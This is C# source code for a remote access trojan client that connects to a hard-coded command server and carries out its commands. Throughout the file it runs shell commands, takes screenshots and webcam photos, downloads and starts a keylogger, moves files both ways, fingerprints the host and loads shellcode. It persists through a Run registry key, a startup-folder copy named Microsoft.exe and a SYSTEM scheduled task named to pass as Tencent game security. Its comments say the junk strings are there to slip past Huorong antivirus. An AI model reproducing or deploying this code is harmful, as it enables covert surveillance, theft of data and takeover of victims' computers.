using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class SynchronousSocketClient
{
    public static string ConnnectIP = "192.168.239.136";
    public static int ConnectPort = 8080;

    public static Socket socks;
    public static bool sendlock = false;
    public static string path2 = "\\AppData\\Roaming\\Microsoft\\";

    public static string Getfuckrong(string lol)
    {
        string path = "混洗火绒用";
        string path2 = "手动代码混洗";
        Console.WriteLine(path + path2);
        return lol;
    }
    public static void StartClient()
    {
        byte[] bytes = new byte[1024];

        try
        {
            String myhostinfo = System.Environment.OSVersion.Version.ToString();

            IPAddress ipAddress = IPAddress.Parse(ConnnectIP);
            IPEndPoint remoteEP = new IPEndPoint(ipAddress, ConnectPort);

            // Create a TCP/IP  socket.  
            socks = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            try
            {
                socks.Connect(remoteEP);

                byte[] msg = Encoding.UTF8.GetBytes(myhostinfo + "<EOF>");
                int bytesSent = socks.Send(msg);
                Console.WriteLine("已经发送握手信息");

                int bytesRec = socks.Receive(bytes);
                Console.WriteLine("收到回复(即发送内容):{0}", Encoding.UTF8.GetString(bytes, 0, bytesRec));

            }
            catch (Exception e)
            {
                Console.WriteLine("Unexpected exception : {0}", e.ToString());
            }

        }
        catch (Exception e)
        {
            Console.WriteLine(e.ToString());
            StartClient();
        }
    }
    public static void loadshellcode()
    {
        Process ps = new Process();
        ps.StartInfo.FileName = "s.exe";
        ps.StartInfo.Arguments = "-i s.bin";
        ps.StartInfo.UseShellExecute = false;
        ps.StartInfo.RedirectStandardInput = true;
        ps.StartInfo.RedirectStandardOutput = true;
        ps.StartInfo.RedirectStandardError = true;
        ps.StartInfo.CreateNoWindow = true;
        ps.Start();
    }
    public static void createtask()
    {

        try
        {
            string path = Assembly.GetEntryAssembly().Location;
            string comm = "schtasks.exe /create /tn 腾讯游戏安全 /ru SYSTEM /sc ONSTART /tr ";
            string acomm = comm + path;
            Console.WriteLine("执行" + acomm);

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + acomm;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
        }
        catch (Exception e)
        {
            Console.WriteLine("计划任务创建失败！");
            Console.WriteLine(e.ToString());
        }
    }
    public static void AutoStart(bool isAuto)
    {
        try
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            string filename = Application.ExecutablePath;
            if (!System.IO.File.Exists(filename))
            {
                return;
            }
            String name = filename.Substring(filename.LastIndexOf(@"\") + 1);
            if (isAuto)
            {
                if (key == null)
                {
                    key = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                    key.SetValue(name, filename);
                }
                else
                {
                    key.SetValue(name, filename);
                }
                key.Close();
            }
            else
            {

                if (key != null && key.GetValue(name) != null)
                {
                    key.DeleteValue(name);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("需要管理员权限！");
            Console.WriteLine(ex.ToString());
        }
    }
    public static string getMainResolution()
    {
        return SystemInformation.PrimaryMonitorSize.Width + " x " + SystemInformation.PrimaryMonitorSize.Height;
    }
    public static string getCpuName()
    {
        string st = "";
        ManagementObjectSearcher driveID = new ManagementObjectSearcher("Select * from Win32_Processor");
        foreach (ManagementObject mo in driveID.Get())
        {
            st = mo["Name"].ToString();
        }
        return st;
    }
    public static string getLocalhostMac()
    {
        string mac = null;
        ManagementObjectSearcher query = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration");
        ManagementObjectCollection queryCollection = query.Get();
        foreach (ManagementObject mo in queryCollection)
        {
            if (mo["IPEnabled"].ToString() == "True")
                mac = mo["MacAddress"].ToString();
        }
        return (mac);
    }
    public static string getSizeOfDisk()
    {
        ManagementClass mc = new ManagementClass("Win32_DiskDrive");
        ManagementObjectCollection moj = mc.GetInstances();
        foreach (ManagementObject m in moj)
        {
            return m.Properties["Size"].Value.ToString();
        }
        return "-1";
    }
    public static string getPhysicalMemory()
    {
        string st = "";
        ManagementClass mc = new ManagementClass("Win32_ComputerSystem");
        ManagementObjectCollection moc = mc.GetInstances();
        foreach (ManagementObject mo in moc)
        {
            st = mo["TotalPhysicalMemory"].ToString();
        }
        return st;
    }
    public static void Keyloger(int i)
    {
        try
        {
            if ((i == 1))
            {
                Process p = new Process();
                p.StartInfo.FileName = "keylog.exe";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                Console.WriteLine("键盘监听开始");
            }

            if ((i == 0))
            {
                Process[] process = Process.GetProcessesByName("keylog");
                foreach (Process p in process)
                {
                    Console.WriteLine("键盘监听结束");
                    p.Kill();
                }
                socks.SendFile("out.txt", null, Encoding.UTF8.GetBytes("<EOF>"), TransmitFileOptions.UseDefaultWorkerThread);
            }
        }
        catch
        {
            Console.WriteLine("发生错误,可能是未找到组件或进程不存在");
        }
    }
    public static void sendpic()
    {
        try
        {
            Image image = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(image);
            g.CopyFromScreen(new System.Drawing.Point(0, 0), new System.Drawing.Point(0, 0), Screen.PrimaryScreen.Bounds.Size);
            image.Save(@".\s.jpg", ImageFormat.Jpeg);

            FileStream fs = new FileStream(@"s.jpg", FileMode.Open);
            long contentLength = fs.Length;
            socks.Send(BitConverter.GetBytes(contentLength));
            Console.WriteLine("文件大小发送完成");
            while (true)
            {
                //每次发送128字节               
                byte[] bits = new byte[2048];
                int r = fs.Read(bits, 0, bits.Length);
                if (r <= 0) break;
                socks.Send(bits, r, SocketFlags.None);
            }

            fs.Position = 0;
            fs.Close();
            Console.WriteLine("文件发送完成");
        }
        catch (Exception e)
        {
            Console.WriteLine(e.ToString());
        }
    }
    public static void fuckcomm(string comm)
    {
        string command = comm;
        string commtype = command.Substring(0, 1);
        string execucomm = command.Substring(1, command.Length - 1);
        if (sendlock == false)
        {
            //相应检查连接
            if (string.Compare(commtype, "B") == 0)
            {
                sendlock = true;
                byte[] msg = Encoding.UTF8.GetBytes("B");
                socks.Send(msg);
                sendlock = false;
            }

            //执行cmd命令
            if ((string.Compare(commtype, "c") == 0))
            {
                sendlock = true;

                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                //向cmd窗口发送输入信息
                p.StandardInput.WriteLine(execucomm + "&exit");
                p.StandardInput.AutoFlush = true;
                //获取输出信息
                string strOuput = p.StandardOutput.ReadToEnd();
                //等待程序执行完退出进程
                p.WaitForExit();
                p.Close();
                Console.WriteLine(strOuput);
                socks.Send(Encoding.UTF8.GetBytes(strOuput));
                socks.Send(Encoding.UTF8.GetBytes("<EOF>"));
                sendlock = false;
            }
            if ((string.Compare(commtype, "a") == 0))
            {
                sendlock = true;
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c " + execucomm;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.CreateNoWindow = true;
                socks.Send(Encoding.UTF8.GetBytes("D"));
                p.Start();
                sendlock = false;
            }

            //屏幕监控
            if ((string.Compare(commtype, "D") == 0))
            {
                sendlock = true;
                sendpic();
                sendlock = false;
            }

            //键盘监控 KU 开启 KD 停止  KF下载文件
            if ((string.Compare(commtype, "K") == 0))
            {
                Console.WriteLine("监控键盘");
                if (string.Compare(execucomm, "F") == 0)
                {
                    Console.WriteLine("开始下载文件");
                    FileStream fs = new FileStream(@"keylog.exe", FileMode.Create);
                    byte[] data = new byte[8];
                    socks.Receive(data, data.Length, SocketFlags.None);
                    long contentLength = BitConverter.ToInt64(data, 0);
                    int size = 0;

                    while (size < contentLength)
                    {
                        byte[] bits = new byte[128];
                        int r = socks.Receive(bits, bits.Length, SocketFlags.None);
                        if (r <= 0) break;
                        fs.Write(bits, 0, r);
                        size += r;
                    }

                    fs.Flush();
                    fs.Close();

                    Console.WriteLine("键盘监控组件接收成功");
                }
                if (string.Compare(execucomm, "U") == 0)
                {
                    Keyloger(1);
                }
                if (string.Compare(execucomm, "D") == 0)
                {
                    Keyloger(0);
                    try
                    {
                        File.Delete("out.txt");
                        File.Delete("keylog.exe");
                    }
                    catch
                    {
                        Console.WriteLine("清理辣鸡失败！");
                    }
                }
            }

            //拍照 SU获取个数 SF下载拍照 SC拍照 SC1 一号摄像头 SC0 零号摄像头
            if ((string.Compare(commtype, "S")) == 0)
            {
                sendlock = true;
                try
                {
                    if (string.Compare(execucomm, "F") == 0)
                    {
                        FileStream fs = new FileStream(@"cam.exe", FileMode.Create);
                        byte[] data = new byte[8];
                        socks.Receive(data, data.Length, SocketFlags.None);
                        long contentLength = BitConverter.ToInt64(data, 0);
                        int size = 0;

                        while (size < contentLength)
                        {
                            byte[] bits = new byte[128];
                            int r = socks.Receive(bits, bits.Length, SocketFlags.None);
                            if (r <= 0) break;
                            fs.Write(bits, 0, r);
                            size += r;
                        }

                        fs.Flush();
                        fs.Close();
                    }

                    if (string.Compare(execucomm.Substring(0, 1), "C") == 0)
                    {
                        try
                        {
                            Console.WriteLine("目标摄像头:" + execucomm.Substring(1, 1));
                            int camnum = int.Parse(execucomm.Substring(1, 1));

                            Process p = new Process();
                            p.StartInfo.FileName = "cam.exe";
                            p.StartInfo.Arguments = camnum.ToString();
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.StartInfo.CreateNoWindow = true;
                            p.Start();
                            p.WaitForExit();
                            p.Close();

                            Thread.Sleep(500);


                            FileStream fs = new FileStream(@"1.jpg", FileMode.Open);
                            long contentLength = fs.Length;
                            socks.Send(BitConverter.GetBytes(contentLength));
                            while (true)
                            {
                                //每次发送128字节               
                                byte[] bits = new byte[128];
                                int r = fs.Read(bits, 0, bits.Length);
                                if (r <= 0) break;
                                socks.Send(bits, r, SocketFlags.None);
                            }
                            fs.Position = 0;

                            fs.Close();
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e.ToString());
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }

                sendlock = false;
            }

            //下载文件 F路径
            if ((string.Compare(commtype, "F")) == 0)
            {
                sendlock = true;
                string filepath = execucomm;
                if (!File.Exists(filepath))
                {
                    socks.Send(Encoding.UTF8.GetBytes("NULL<EOF>"));
                }

                FileStream fs = new FileStream(@filepath, FileMode.Open);
                long contentLength = fs.Length;
                socks.Send(BitConverter.GetBytes(contentLength));
                while (true)
                {
                    //每次发送128字节               
                    byte[] bits = new byte[128];
                    int r = fs.Read(bits, 0, bits.Length);
                    if (r <= 0) break;
                    socks.Send(bits, r, SocketFlags.None);
                }
                fs.Position = 0;

                fs.Close();

                sendlock = false;
            }
            //上传文件 U路径
            if (string.Compare(commtype, "U") == 0)
            {
                sendlock = true;
                string filepath = execucomm;
                try
                {
                    FileStream fs = new FileStream(filepath, FileMode.Create);
                    byte[] data = new byte[8];
                    socks.Receive(data, data.Length, SocketFlags.None);
                    long contentLength = BitConverter.ToInt64(data, 0);
                    int size = 0;

                    while (size < contentLength)
                    {
                        byte[] bits = new byte[128];
                        int r = socks.Receive(bits, bits.Length, SocketFlags.None);
                        if (r <= 0) break;
                        fs.Write(bits, 0, r);
                        size += r;
                    }

                    fs.Flush();
                    fs.Close();

                    Console.WriteLine("文件接收成功");
                }
                catch
                {
                    Console.WriteLine("出现异常！");
                }
                sendlock = false;
            }

            //获取系统详细信息 EE
            if (string.Compare(commtype, "E") == 0)
            {
                string pcname = Environment.GetEnvironmentVariable("computername");
                string macadd = getLocalhostMac();
                //string cpunum = getCpuCount().ToString();
                string resoul = getMainResolution();
                string cpuname = getCpuName();
                string memsize = getPhysicalMemory();
                string disksize = getSizeOfDisk();

                string allsend = pcname + "," + macadd + "," + resoul + "," + cpuname + "," + memsize + "," + disksize;
                socks.Send(Encoding.UTF8.GetBytes(allsend));
            }

            //开机自启 QA QB QC QD
            if (string.Compare(commtype, "Q") == 0)
            {
                if (string.Compare(execucomm, "A") == 0)
                {
                    try
                    {
                        //火绒会识别开机启动目录 这样可以防止火绒识别

                        Console.WriteLine("正在将自己复制启动目录");
                        string username = System.Environment.UserName;
                        string path = "C:\\Users\\" + username;
                        string path3 = "火绒 360 腾讯电脑管家 金山毒霸 P2P高速下载器"; //混淆
                        string path4 = "火绒我是你爹"; //混淆
                        string path5 = "Windows\\Start Menu\\";
                        string path7 = "富强、民主、文明、和谐"; //混淆

                        Getfuckrong("自由、平等、公正、法治"); //混淆
                        string path6 = "Programs\\Startup\\Microsoft.exe";
                        Console.WriteLine("文件路径：" + path + path2 + path5 + path6);

                        string fuckhuorong = "爱国、敬业、诚信、友善"; //混淆
                        string alpth = path3 + path4 + path5 + path6 + fuckhuorong + path7; //混淆
                        Console.WriteLine("混昔火绒" + alpth); //混淆
                        string allpath = path + path2 + path5 + path6;

                        File.Copy(Assembly.GetEntryAssembly().Location, allpath);
                        Console.WriteLine("文件复制成功");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("复制失败 文件已存在！");
                        Console.WriteLine(e.ToString());
                    }
                }
                if (string.Compare(execucomm, "B") == 0) AutoStart(true);
                if (string.Compare(execucomm, "D") == 0) createtask();
            }

            //加载shellcode
            if (string.Compare(commtype, "Z") == 0)
            {
                sendlock = true;
                Thread th = new Thread(loadshellcode);
                th.Start();
                sendlock = false;
            }
        }
        else
        {
            Console.WriteLine("发送已被锁定，这条指令不会执行");
        }

        GC.Collect(); //火速释放内存
    }
    public static int Main(String[] args)
    {
        StartClient();
        Console.WriteLine("与服务器建立连接成功，开始等待服务器指令");

        try
        {
            while (true)
            {
                byte[] bytes = new byte[4096];
                string Gotcommand = string.Empty;
                socks.Receive(bytes);
                Gotcommand = Encoding.UTF8.GetString(bytes);
                Gotcommand = Gotcommand.Replace("\0", "");
                Console.WriteLine("收到指令:" + Gotcommand);

                fuckcomm(Gotcommand);
            }
        }
        catch (Exception e)
        {
            Main(null);
            Thread.Sleep(5000);
            Console.WriteLine("发生致命故障" + e.ToString());
        }

        return 0;
    }
}